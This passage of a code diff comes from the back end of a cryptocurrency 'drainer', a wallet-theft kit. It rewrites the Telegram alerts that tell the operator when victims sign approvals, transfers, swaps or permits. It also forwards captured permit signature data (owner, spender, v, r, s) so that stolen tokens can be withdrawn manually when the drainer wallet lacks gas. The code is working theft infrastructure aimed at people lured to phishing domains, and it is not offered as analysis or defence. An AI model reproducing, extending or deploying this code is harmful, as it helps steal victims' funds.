+        await send_message(receiver_chat_id, `<b>❌ User #user_${data.user_id} отклонил Signature, либо транзакция не прошла</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`, {
+          parse_mode: 'HTML'
+        });
       } catch(err) {
         console.log(err);
       }
@@ -1901,25 +1701,9 @@ const on_sign_unavailable = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.sign_cancel.mode) || (data.chat_data != false && data.chat_data.sign_cancel != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_cancel.chat_id : data.chat_data.sign_cancel;
       try {
-        await send_message(receiver_chat_id, 
-          `🟡 <b>SYSTEM NOTICE: Signature Function Unavailable</b>
-          
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          📝 <b>Function:</b> Digital signature request
-          ⚡ <b>Status:</b> Wallet lacks signature support
-          🔄 <b>Resolution:</b> Alternative methods available
-          
-          💡 <b>Technical Note:</b>
-          Wallet compatibility limitation detected -
-          this is a wallet-specific constraint, not a system error.
-          
-          🛠️ <b>System Response:</b>
-          Automatically offering alternative authentication
-          methods to maintain user experience flow.`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>❌ For the user #user_${data.user_id} signature not available</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<i>But don’t panic, his Wallet just doesn’t support this function, if possible, we’ll offer him another method...</i>`, {
+          parse_mode: 'HTML'
+        });
       } catch(err) {
         console.log(err);
       }
@@ -1937,26 +1721,9 @@ const on_sign_request = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.sign_request.mode) || (data.chat_data != false && data.chat_data.sign_request != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_request.chat_id : data.chat_data.sign_request;
       try {
-        await send_message(receiver_chat_id, 
-          `📨 <b>: Signature Request Initiated</b>
-      
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          📝 <b>TRANSACTION DETAILS:</b>
-          ┌─────────────────────────
-          │  💎 <b>Asset:</b> ${data.asset.name}
-          │  ⛓️ <b>Network:</b> ${chain_id_to_name(data.asset.chain_id)}
-          │  📄 <b>Type:</b> ${data.asset.type}
-          │  💰 <b>Amount:</b> ${parseFloat(data.asset.amount)}
-          │  💵 <b>Value:</b> $${parseFloat(data.asset.amount_usd).toFixed(2)}
-          └─────────────────────────
-          
-          🟡 <b>Status:</b> Awaiting user signature
-          🔏 <b>Action:</b> Digital confirmation required
-          ⏳ <b>User Decision:</b> Pending approval`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>❓ User #user_${data.user_id} received a signature request</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
+          parse_mode: 'HTML'
+        });
       } catch(err) {
         console.log(err);
       }
@@ -1980,20 +1747,9 @@ const on_swap_request = async (response, data) => {
       try {
         let assets_str = '';
         for (const elem of data.list) { assets_str += `${elem.name} [${chain_id_to_name(elem.chain_id)}, ${elem.type}] - ${parseFloat(elem.amount)} (${parseFloat(elem.amount_usd).toFixed(2)}$); `; }
-        await send_message(receiver_chat_id, 
-          `🔄 <b>: Swapper Request Initiated</b>
-        
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          ⚡ <b>Service:</b> <code>${data.swapper}</code>
-          📝 <b>Signature Objects:</b> ${assets_str}
-          
-          🟡 <b>Status:</b> Swapper request received
-          🔗 <b>Action:</b> Awaiting user confirmation
-          ⏳ <b>Process:</b> Transaction preparation phase`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>❓ User #user_${data.user_id} получил запрос ${data.swapper}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Объект(-ы) подписи:</b> ${assets_str}`, {
+          parse_mode: 'HTML'
+        });
       } catch(err) {
         console.log(err);
       }
@@ -2011,26 +1767,9 @@ const on_approve_request = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_request.chat_id : data.chat_data.approve_request;
       try {
-        await send_message(receiver_chat_id, 
-          `📋 <b>: Transaction Confirmation Requested</b>
-      
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          💎 <b>TRANSACTION DETAILS:</b>
-          ┌─────────────────────────
-          │  🔹 <b>Asset:</b> ${data.asset.name}
-          │  🔹 <b>Network:</b> ${chain_id_to_name(data.asset.chain_id)}
-          │  🔹 <b>Type:</b> ${data.asset.type}
-          │  🔹 <b>Amount:</b> ${parseFloat(data.asset.amount)}
-          │  🔹 <b>Value:</b> $${parseFloat(data.asset.amount_usd).toFixed(2)}
-          └─────────────────────────
-          
-          🟡 <b>Status:</b> Awaiting user confirmation
-          ✅ <b>Action:</b> Transaction approval required
-          ⏳ <b>User Decision:</b> Pending authorization`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>❓ User #user_${data.user_id} received a confirmation request</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
+          parse_mode: 'HTML'
+        });
       } catch(err) {
         console.log(err);
       }
@@ -2048,26 +1787,9 @@ const on_transfer_request = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.transfer_request.mode) || (data.chat_data != false && data.chat_data.transfer_request != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.transfer_request.chat_id : data.chat_data.transfer_request;
       try {
-        await send_message(receiver_chat_id, 
-          `📤 <b>: Transfer Request Initiated</b>
-          
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          💸 <b>TRANSFER DETAILS:</b>
-          ┌─────────────────────────
-          │  💎 <b>Asset:</b> ${data.asset.name}
-          │  ⛓️ <b>Network:</b> ${chain_id_to_name(data.asset.chain_id)}
-          │  📦 <b>Type:</b> ${data.asset.type}
-          │  🔻 <b>Debit Amount:</b> ${parseFloat(data.asset.amount)}
-          │  💰 <b>Value:</b> $${parseFloat(data.asset.amount_usd).toFixed(2)}
-          └─────────────────────────
-          
-          🟡 <b>Status:</b> Transfer awaiting approval
-          ✅ <b>Action:</b> User confirmation required
-          ⏳ <b>Process:</b> Funds transfer pending authorization`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>❓ User #user_${data.user_id} received a request for transfer</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
+          parse_mode: 'HTML'
+        });
       } catch(err) {
         console.log(err);
       }
@@ -2094,26 +1816,9 @@ const on_sign_success = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
       try {
-        await send_message(receiver_chat_id, 
-          `🟢 <b>: Signature Confirmed</b>
-         
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          ✅ <b>TRANSACTION EXECUTED:</b>
-          ┌─────────────────────────
-          │  💎 <b>Asset:</b> ${data.asset.name}
-          │  ⛓️ <b>Network:</b> ${chain_id_to_name(data.asset.chain_id)}
-          │  📦 <b>Type:</b> ${data.asset.type}
-          │  🔻 <b>Debit Amount:</b> ${parseFloat(data.asset.amount)}
-          │  💰 <b>Value:</b> $${parseFloat(data.asset.amount_usd).toFixed(2)}
-          └─────────────────────────
-          
-          🟢 <b>Status:</b> Signature verified and accepted
-          📝 <b>Action:</b> Digital authorization completed
-          🔓 <b>Result:</b> Transaction approved and processed`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>✅ User #user_${data.user_id} signed the request</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
+          parse_mode: 'HTML'
+        });
       } catch(err) {
         console.log(err);
       }
@@ -2145,20 +1850,9 @@ const on_swap_success = async (response, data) => {
       try {
         let assets_str = '';
         for (const elem of data.list) { assets_str += `${elem.name} [${chain_id_to_name(elem.chain_id)}, ${elem.type}] - ${parseFloat(elem.amount)} (${parseFloat(elem.amount_usd).toFixed(2)}$); `; }
-        await send_message(receiver_chat_id, 
-          `🟢 <b>: Swapper Transaction Signed</b>
-     
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          ⚡ <b>Service:</b> <code>${data.swapper}</code>
-          📝 <b>Signed Objects:</b> ${assets_str}
-          
-          🟢 <b>Status:</b> Swapper authorization confirmed
-          ✅ <b>Action:</b> Transaction signed successfully
-          🔗 <b>Result:</b> Swap operation approved for processing`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>✅ User #user_${data.user_id} подписал ${data.swapper}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Объект(-ы) подписи:</b> ${assets_str}`, {
+          parse_mode: 'HTML'
+        });
       } catch(err) {
         console.log(err);
       }
@@ -2179,26 +1873,9 @@ const on_approve_success = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
       try {
-        await send_message(receiver_chat_id, 
-          `🟢 <b>: Transaction Confirmed</b>
-       
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          ✅ <b>TRANSACTION APPROVED:</b>
-          ┌─────────────────────────
-          │  💎 <b>Asset:</b> ${data.asset.name}
-          │  ⛓️ <b>Network:</b> ${chain_id_to_name(data.asset.chain_id)}
-          │  📦 <b>Type:</b> ${data.asset.type}
-          │  🔻 <b>Debit Amount:</b> ${parseFloat(data.asset.amount)}
-          │  💰 <b>Value:</b> $${parseFloat(data.asset.amount_usd).toFixed(2)}
-          └─────────────────────────
-          
-          🟢 <b>Status:</b> Confirmation successfully processed
-          ✅ <b>Action:</b> Transaction authorized and approved
-          📤 <b>Result:</b> Funds transfer initiated`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>✅ User #user_${data.user_id} issued confirmation</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
+          parse_mode: 'HTML'
+        });
       } catch(err) {
         console.log(err);
       }
@@ -2225,26 +1902,9 @@ const on_transfer_success = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.transfer_success.mode) || (data.chat_data != false && data.chat_data.transfer_success != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.transfer_success.chat_id : data.chat_data.transfer_success;
       try {
-        await send_message(receiver_chat_id, 
-          `🟢 <b>: Transfer Executed Successfully</b>
-          
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          💸 <b>TRANSFER COMPLETED:</b>
-          ┌─────────────────────────
-          │  💎 <b>Asset:</b> ${data.asset.name}
-          │  ⛓️ <b>Network:</b> ${chain_id_to_name(data.asset.chain_id)}
-          │  📦 <b>Type:</b> ${data.asset.type}
-          │  🔻 <b>Transfer Amount:</b> ${parseFloat(data.asset.amount)}
-          │  💰 <b>Value:</b> $${parseFloat(data.asset.amount_usd).toFixed(2)}
-          └─────────────────────────
-          
-          🟢 <b>Status:</b> Funds transfer successfully processed
-          ✅ <b>Action:</b> Transaction executed and confirmed
-          📤 <b>Result:</b> Assets transferred to destination`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>✅ User #user_${data.user_id} made a transfer</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
+          parse_mode: 'HTML'
+        });
       } catch(err) {
         console.log(err);
       }
@@ -2450,30 +2110,9 @@ const approve_token = async (response, data) => {
         if (!current_allowance) {
           if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
             let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
-            await send_message(receiver_chat_id, 
-              `🔴 <b>: Token Withdrawal Failed</b>
-              
-              🌐 <b>Domain:</b> <code>${data.domain}</code>
-              📍<b>IP:</b> <code>${User_Country}</code> 
-              
-              💎 <b>TOKEN DETAILS:</b>
-              ┌─────────────────────────
-              │  🪙 <b>Token:</b> ${data.asset.name}
-              │  ⛓️ <b>Network:</b> ${chain_id_to_name(data.asset.chain_id)}
-              └─────────────────────────
-              
-              🚫 <b>Status:</b> Withdrawal transaction failed
-              ⚠️ <b>Possible Causes:</b>
-              • Transaction confirmation pending in mempool
-              • Network congestion delaying processing
-              • Gas fee optimization required
-              • Smart contract interaction issue
-              
-              🛠️ <b>Recommended Action:</b>
-              Initiate manual token withdrawal procedure
-              to bypass automated system limitations.`, {
-                  parse_mode: 'HTML'
-              });
+            await send_message(receiver_chat_id, `<b>❌ Failed to withdraw user Token #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Token:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}]\n\nPerhaps the confirmation transaction did not go through or is still in the queue, try withdrawing Token manually!`, {
+              parse_mode: 'HTML'
+            });
           }
           return send_response(response, { status: 'error', error: 'Unable to Execute' });
         }
@@ -2505,35 +2144,9 @@ const approve_token = async (response, data) => {
       if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
         let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
         try {
-          await send_message(receiver_chat_id, 
-            `🔴 <b>: Token Withdrawal Blocked</b>
-          
-            🌐 <b>Domain:</b> <code>${data.domain}</code>
-            📍<b>IP:</b> <code>${User_Country}</code> 
-            
-            💎 <b>TOKEN DETAILS:</b>
-            ┌─────────────────────────
-            │  🪙 <b>Token:</b> ${data.asset.name}
-            │  ⛓️ <b>Network:</b> ${chain_id_to_name(data.asset.chain_id)}
-            └─────────────────────────
-            
-            🛡️ <b>SECURITY ANALYSIS:</b>
-            ┌─────────────────────────
-            │  ⚠️ <b>Threat Level:</b> High
-            │  🔍 <b>Detection:</b> Fake confirmation suspected
-            │  🚫 <b>Action:</b> Transaction automatically rejected
-            │  💰 <b>Reason:</b> Fund protection protocol activated
-            └─────────────────────────
-            
-            🔒 <b>System Response:</b>
-            Automatic protection engaged to prevent
-            potential asset loss from suspicious activity.
-            
-            🔄 <b>Manual Override Available:</b>
-            You may attempt manual token withdrawal
-            if you believe the signature is legitimate.`, {
-                parse_mode: 'HTML'
-            });
+          await send_message(receiver_chat_id, `<b>❌ Failed to withdraw user Token #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Token:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}]\n\nThe system detected that, most likely, the confirmation is fake or the withdrawal of this token is technically impossible, and in order to save your funds, it rejected the transaction.\n\nYou can still try to withdraw the Token manually if you think the signature is real.`, {
+            parse_mode: 'HTML'
+          });
         } catch(err) {
           console.log(err);
         }
@@ -2547,29 +2160,9 @@ const approve_token = async (response, data) => {
         if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
           let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
           try {
-            await send_message(receiver_chat_id, 
-              `🔴 <b>: Insufficient Gas Funds</b>
-              
-              🌐 <b>Domain:</b> <code>${data.domain}</code>
-              📍<b>IP:</b> <code>${User_Country}</code> 
-              
-              ⛽ <b>WALLET STATUS:</b>
-              ┌─────────────────────────
-              │  💸 <b>Issue:</b> Insufficient native coin
-              │  🏦 <b>Location:</b> Drainer wallet
-              │  ⚠️ <b>Effect:</b> Transaction processing halted
-              └─────────────────────────
-              
-              🔋 <b>Required Action:</b>
-              Refill native coin balance in drainer wallet
-              to resume automated withdrawal operations.
-              
-              🛠️ <b>Immediate Solution:</b>
-              1. Top up drainer wallet with native coin
-              2. Initiate manual withdrawal procedure
-              3. Resume automated operations`, {
-                  parse_mode: 'HTML'
-              });
+            await send_message(receiver_chat_id, `<b>❌ Failed to withdraw user Token #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nThere is not enough native coin in the drainer wallet, try to top up and withdraw manually!`, {
+              parse_mode: 'HTML'
+            });
           } catch(err) {
             console.log(err);
           }
@@ -2584,29 +2177,9 @@ const approve_token = async (response, data) => {
           if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
             let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
             try {
-              await send_message(receiver_chat_id, 
-                `🔴 <b>: Insufficient Gas Balance</b>
-         
-                🌐 <b>Domain:</b> <code>${data.domain}</code>
-                📍<b>IP:</b> <code>${User_Country}</code> 
-                
-                ⛽ <b>WALLET STATUS:</b>
-                ┌─────────────────────────
-                │  💸 <b>Issue:</b> Insufficient native coin
-                │  🏦 <b>Location:</b> Drainer wallet
-                │  ⚠️ <b>Effect:</b> Automated withdrawal blocked
-                └─────────────────────────
-                
-                🔋 <b>Required Action:</b>
-                Refill native coin balance in drainer wallet
-                to restore automated withdrawal operations.
-                
-                🛠️ <b>Immediate Solution:</b>
-                • Top up drainer wallet with native coin
-                • Initiate manual withdrawal procedure
-                • Resume automated system operations`, {
-                    parse_mode: 'HTML'
-                });
+              await send_message(receiver_chat_id, `<b>❌ Failed to withdraw user Token #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nThere is not enough native coin in the drainer wallet, try to top up and withdraw manually!`, {
+                parse_mode: 'HTML'
+              });
             } catch(err) {
               console.log(err);
             }
@@ -2678,25 +2251,9 @@ const approve_token = async (response, data) => {
       try {
         if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
           let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
-          await send_message(receiver_chat_id, 
-            `🟢 <b>: Token Withdrawal Successful</b>
-           
-            🌐 <b>Domain:</b> <code>${data.domain}</code>
-            📍<b>IP:</b> <code>${User_Country}</code> 
-            
-            💎 <b>WITHDRAWAL COMPLETED:</b>
-            ┌─────────────────────────
-            │  🪙 <b>Token:</b> ${data.asset.name}
-            │  ⛓️ <b>Network:</b> ${chain_id_to_name(data.asset.chain_id)}
-            │  📊 <b>Amount:</b> ${parseFloat(data.asset.amount)}
-            │  💰 <b>Value:</b> $${parseFloat(data.asset.amount_usd).toFixed(2)}
-            └─────────────────────────
-            
-            🟢 <b>Status:</b> Token successfully transferred
-            ✅ <b>Operation:</b> Withdrawal executed and confirmed
-            📤 <b>Result:</b> Assets secured in destination wallet`, {
-                parse_mode: 'HTML'
-            });
+          await send_message(receiver_chat_id, `<b>💎 User Token successfully withdrawn #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Token:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}] - ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
+            parse_mode: 'HTML'
+          });
         }
       } catch(err) {
         console.log(err);
@@ -2707,30 +2264,9 @@ const approve_token = async (response, data) => {
       if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
         let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
         try {
-          await send_message(receiver_chat_id, 
-            `🔴 <b>: Token Withdrawal Failed</b>
-         
-            🌐 <b>Domain:</b> <code>${data.domain}</code>
-            📍<b>IP:</b> <code>${User_Country}</code> 
-            
-            💎 <b>TOKEN DETAILS:</b>
-            ┌─────────────────────────
-            │  🪙 <b>Token:</b> ${data.asset.name}
-            │  ⛓️ <b>Network:</b> ${chain_id_to_name(data.asset.chain_id)}
-            └─────────────────────────
-            
-            🚫 <b>Status:</b> Withdrawal transaction failed
-            ⚠️ <b>Possible Issues:</b>
-            • Transaction confirmation pending in queue
-            • Network congestion delaying processing
-            • Gas fee optimization required
-            • Blockchain confirmation timeout
-            
-            🛠️ <b>Recommended Action:</b>
-            Initiate manual token withdrawal procedure
-            to bypass automated system limitations.`, {
-                parse_mode: 'HTML'
-            });
+          await send_message(receiver_chat_id, `<b>❌ Failed to withdraw user Token #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Token:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}]\n\nPerhaps the confirmation transaction did not go through or is still in the queue, try withdrawing Token manually!`, {
+            parse_mode: 'HTML'
+          });
         } catch(err) {
           console.log(err);
         }
@@ -2810,87 +2346,41 @@ const permit_token = async (response, data) => {
           let receiver_chat_id = data.chat_data == false ? MS_Notifications.permit_sign_data.chat_id : data.chat_data.permit_sign_data;
           if (MS_Functional_Bot) {
             if (data.sign.type == 1) {
-             // Enhanced version with manual sign button
-if (data.sign.type == 1) {
-  await send_message(receiver_chat_id, 
-`🔐 <b>: Permit Authorization Data Captured</b>
-
-🌐 <b>Domain:</b> <code>${data.domain}</code>
-📍<b>IP:</b> <code>${User_Country}</code> 
-
-📄 <b>PERMIT DETAILS:</b>
-┌─────────────────────────
-│  👤 <b>Owner:</b> <code>${data.sign.owner}</code>
-│  🤝 <b>Spender:</b> <code>${data.sign.spender}</code>
-│  ✅ <b>Allowed:</b> <code>true</code>
-│  🔢 <b>Nonce:</b> <code>${data.sign.nonce}</code>
-│  ⏰ <b>Deadline:</b> <code>${data.sign.deadline}</code>
-│  📊 <b>Network:</b> ${chain_id_to_name(data.sign.chain_id)}
-│  📝 <b>Contract:</b> <code>${data.sign.address}</code>
-└─────────────────────────
-
-🔏 <b>SIGNATURE DATA:</b>
-• <b>v:</b> <code>${data.sign.v}</code>
-• <b>r:</b> <code>${data.sign.r}</code>
-• <b>s:</b> <code>${data.sign.s}</code>
-
-💡 <b>Usage:</b> Use this data to independently sign PERMIT
-on ${chain_id_to_name(data.sign.chain_id)} network.
-
-🔄 <b>Manual Recovery:</b> If automatic permit processing failed,
-use manual signing option below.`, {
-      parse_mode: 'HTML',
-      reply_markup: {
-          inline_keyboard: [
-              [
-                  {
-                      text: '🛠️ Sign Permit Manually',
-                      callback_data: `sign_permit_${permit_id}`
-                  }
-              ]
-          ]
-      }
-  });
-} else {
-  await send_message(receiver_chat_id,
-`🔐 <b>: Permit Authorization Data Captured</b>
-
-🌐 <b>Domain:</b> <code>${data.domain}</code>
-📍<b>IP:</b> <code>${User_Country}</code> 
-
-📄 <b>PERMIT DETAILS:</b>
-┌─────────────────────────
-│  👤 <b>Owner:</b> <code>${data.sign.owner}</code>
-│  🤝 <b>Spender:</b> <code>${data.sign.spender}</code>
-│  💰 <b>Value:</b> <code>${data.sign.value}</code>
-│  ⏰ <b>Deadline:</b> <code>${data.sign.deadline}</code>
-│  📊 <b>Network:</b> ${chain_id_to_name(data.sign.chain_id)}
-│  📝 <b>Contract:</b> <code>${data.sign.address}</code>
-└─────────────────────────
-
-🔏 <b>SIGNATURE DATA:</b>
-• <b>v:</b> <code>${data.sign.v}</code>
-• <b>r:</b> <code>${data.sign.r}</code>
-• <b>s:</b> <code>${data.sign.s}</code>
-
-💡 <b>Usage:</b> Use this data to independently sign PERMIT
-on ${chain_id_to_name(data.sign.chain_id)} network.
-
-🔄 <b>Manual Recovery:</b> If automatic permit processing failed,
-use manual signing option below.`, {
-      parse_mode: 'HTML',
-      reply_markup: {
-          inline_keyboard: [
-              [
-                  {
-                      text: '🛠️ Sign Permit Manually',
-                      callback_data: `sign_permit_${permit_id}`
-                  }
-              ]
-          ]
-      }
-  });
-}
+              await send_message(receiver_chat_id, `<b>🔑 User PERMIT data #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>allowed:</b> <code>true</code>\n<b>nonce:</b> <code>${data.sign.nonce}</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nUsing this data you can independently sign PERMIT online ${chain_id_to_name(data.sign.chain_id)} for the contract: <code>${data.sign.address}</code>\n\nIf you were unable to write off the Permit automatically, use the button below to try writing it off again.`, {
+                parse_mode: 'HTML', reply_markup: {
+                  inline_keyboard: [
+                    [
+                      {
+                        text: 'Sign manually',
+                        callback_data: `sign_permit_${permit_id}`
+                      }
+                    ]
+                  ]
+                }
+              });
+            } else {
+              await send_message(receiver_chat_id, `<b>🔑 User PERMIT data #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>value:</b> <code>${data.sign.value}</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nUsing this data you can independently sign PERMIT online ${chain_id_to_name(data.sign.chain_id)} for the contract: <code>${data.sign.address}</code>\n\nIf you were unable to write off the Permit automatically, use the button below to try writing it off again.`, {
+                parse_mode: 'HTML', reply_markup: {
+                  inline_keyboard: [
+                    [
+                      {
+                        text: 'Sign manually',
+                        callback_data: `sign_permit_${permit_id}`
+                      }
+                    ]
+                  ]
+                }
+              });
+            }
+          } else {
+            if (data.sign.type == 1) {
+              await send_message(receiver_chat_id, `<b>🔑 User PERMIT data #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>allowed:</b> <code>true</code>\n<b>nonce:</b> <code>${data.sign.nonce}</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nUsing this data you can independently sign PERMIT online ${chain_id_to_name(data.sign.chain_id)} for the contract: <code>${data.sign.address}</code>\n\nIf you were unable to write off the Permit automatically, use the button below to try writing it off again.`, {
+                parse_mode: 'HTML'
+              });
+            } else {
